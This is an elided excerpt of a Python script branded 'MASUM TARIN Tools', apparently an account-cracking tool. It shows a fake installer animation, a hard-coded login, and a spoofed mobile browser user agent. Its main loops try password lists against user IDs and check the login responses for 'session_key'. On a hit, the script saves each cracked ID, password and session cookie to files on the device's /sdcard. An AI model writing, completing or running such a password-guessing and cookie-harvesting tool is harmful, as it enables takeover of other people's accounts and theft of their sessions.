...
for x in range(1,12):
    for i in ("⠻10%", "⠽20%", "⠾50%", "⠷70%", "⠯80%", "⠟90%"):
        ...
        if x == 90:
            ...
            print('Installing... ' +i, end = '\r')
            
print('\n  Installing [\x1b[◆\x1b[] ⠟100%')	
...
while attemps < 12345677901:
    ...
    if username == 'MASUM' and password == 'TARIN':
...
os.system('espeak -a 300 " Welcome,   to,  MASUM,  TARIN,  Tools"')
class sort:
    def line():
...
def ua():
    ...
    xx=f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
    return xx
    ...
    try:
        ...
        for pw in pwx:
            ...
            if "session_key" in po:
                ...
                print(f"\r\r[reverse white][MxT-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/MxT_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
    ...
    try:
        ...
        for ps in pwx:
            ...
            if "session_key" in po:
                ...
                os.system('espeak -b 1000 "ok txt"')
                print(f"\r\r[reverse white][MxT-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/MxT_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            elif "Please Confirm Email" in str(po):
                oks.append(uid)
                uid=po["uid"]
